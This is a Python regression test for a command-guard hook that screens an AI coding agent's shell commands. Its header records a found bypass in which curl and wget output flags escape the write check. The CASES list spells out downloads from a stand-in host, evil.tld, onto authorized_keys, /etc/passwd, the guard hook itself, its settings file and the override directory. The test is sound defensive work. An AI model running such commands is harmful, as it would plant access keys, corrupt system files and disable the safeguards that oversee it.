# ============================================================================
# A downloader's output flag is a write, and its target must face the
# protected-path gate -- write protection AND self-protection.
#
# Measured 2026-09-21 on a real machine, against a copy of the live version
# with the real rules file (both the German 4079-line version and this one):
#
#   BLOCKED   echo x > $HOME/.ssh/authorized_keys
#   passes    curl -o $HOME/.ssh/authorized_keys https://evil.tld/k
#   passes    curl -o $HOME/.claude/hooks/command-guard.py https://evil.tld/x
#   passes    wget -O <hook> ... / wget --output-document=<hook> ...
#   passes    curl --output=/etc/passwd ... / wget -P $HOME/.claude/bin ...
#
# Cause: _command_is_write knows write verbs, redirects, awk redirection,
# find -delete, rsync --delete, git clean and remote copy -- but no downloader
# output flags. curl/wget appear in the hook only as the pipe-to-shell pattern.
# Without a verb hit the command is judged read-only, so neither
# blocked_paths_write nor the hardcoded self-protection list is ever consulted.
# Full chain: an override file can be dropped straight into the active
# directory, so the approval channel falls too.
#
# These cases are RED against the current version -- the fix in
# 0050-DOWNLOADER-SCHREIBSCHUTZ turns them green. Pure dry run: only decisions
# are inspected, nothing is downloaded or written.
# ============================================================================
import json
import os
import subprocess
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
HOOK = Path(os.environ.get("GUARD_HOOK") or (REPO / "hooks" / "command-guard.py"))
EXAMPLE_RULES = REPO / "security-rules.example.json"
HOME = str(Path.home())

ALLOW = 0
BLOCK = 2

WRITE_PROTECTED = "/etc"
KEYS = f"{HOME}/.ssh"
HOOK_SELF = f"{HOME}/.claude/hooks/command-guard.py"
SETTINGS = f"{HOME}/.claude/settings.json"
OVERRIDE = f"{HOME}/.claude/.sudo-overrides/a.json"
FREE = "/tmp/harmless"
URL = "https://evil.tld/x"

# (id, command, must block)
CASES = [
    # --- the barrier: the downloader really writes there --------------------
    ("curl -o into write-protected dir",
     f"curl -o {WRITE_PROTECTED}/x {URL}", True),
    ("curl --output into write-protected dir",
     f"curl --output {WRITE_PROTECTED}/x {URL}", True),
    ("curl --output= into a system file",
     f"curl --output={WRITE_PROTECTED}/passwd {URL}", True),
    ("wget -O into write-protected dir",
     f"wget -O {WRITE_PROTECTED}/x {URL}", True),
    ("wget --output-document= into write-protected dir",
     f"wget --output-document={WRITE_PROTECTED}/x {URL}", True),
    ("wget -P directory prefix into a protected dir",
     f"wget -P {WRITE_PROTECTED} {URL}", True),
    ("wget --directory-prefix= into a protected dir",
     f"wget --directory-prefix={WRITE_PROTECTED} {URL}", True),
    # The heaviest cases: the key directory and the guard's own machinery.
    ("curl -o into the key directory",
     f"curl -o {KEYS}/authorized_keys {URL}", True),
    ("curl -o onto the guard itself (self-protection)",
     f"curl -o {HOOK_SELF} {URL}", True),
    ("wget -O onto the guard itself (self-protection)",
     f"wget -O {HOOK_SELF} {URL}", True),
    ("wget --output-document= onto the guard itself",
     f"wget --output-document={HOOK_SELF} {URL}", True),
    ("curl -o onto the settings file",
     f"curl -o {SETTINGS} {URL}", True),
    ("curl -o into the active override directory",
     f"curl -o {OVERRIDE} {URL}", True),
    # Counter-probe on the mechanism: the ordinary redirect was never open and
    # stays shut. If this were green, the suite would be testing nothing.
    ("shell redirect still blocked",
     f"echo x > {WRITE_PROTECTED}/x", True),

    # --- naming a URL is not writing a protected path -----------------------
    ("downloading to a free path",
     f"curl -o {FREE}/x {URL}", False),
    ("downloading to stdout, no output flag",
     f"curl {URL}", False),
    ("wget to a free directory prefix",
     f"wget -P /tmp {URL}", False),
    ("an ordinary command", "ls -la /tmp", False),
]


def _make_rules() -> str:
    rules = json.loads(EXAMPLE_RULES.read_text(encoding="utf-8"))
    rules["blocked_paths_write"] = [WRITE_PROTECTED, "~/.ssh"]
    tf = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False,
                                     encoding="utf-8")
    json.dump(rules, tf)
    tf.close()
    return tf.name


def _run(command: str, rules_path: str) -> int:
    payload = {"tool_name": "Bash", "tool_input": {"command": command},
               "session_id": "downloader-write-target-test",
               "hook_event_name": "PreToolUse"}
    with tempfile.TemporaryDirectory() as ov:
        env = dict(os.environ)
        env["CLAUDE_SECURITY_RULES"] = rules_path
        env["CLAUDE_SUDO_OVERRIDES_DIR"] = ov
        env["CLAUDE_AUDIT_DIR"] = ov
        env["CLAUDE_HOOK_DEV_FLAG"] = ov + "/_none"
        p = subprocess.run(["python3", str(HOOK)], input=json.dumps(payload),
                           capture_output=True, text=True, env=env)
        return p.returncode


def test_downloader_write_targets():
    rules_path = _make_rules()
    try:
        failures = []
        for name, command, must_block in CASES:
            code = _run(command, rules_path)
            expected = BLOCK if must_block else ALLOW
            if code != expected:
                failures.append(
                    f"{name}: expected {'BLOCK' if must_block else 'ALLOW'}, "
                    f"got exit {code}")
        assert not failures, "\n".join(failures)
    finally:
        os.unlink(rules_path)
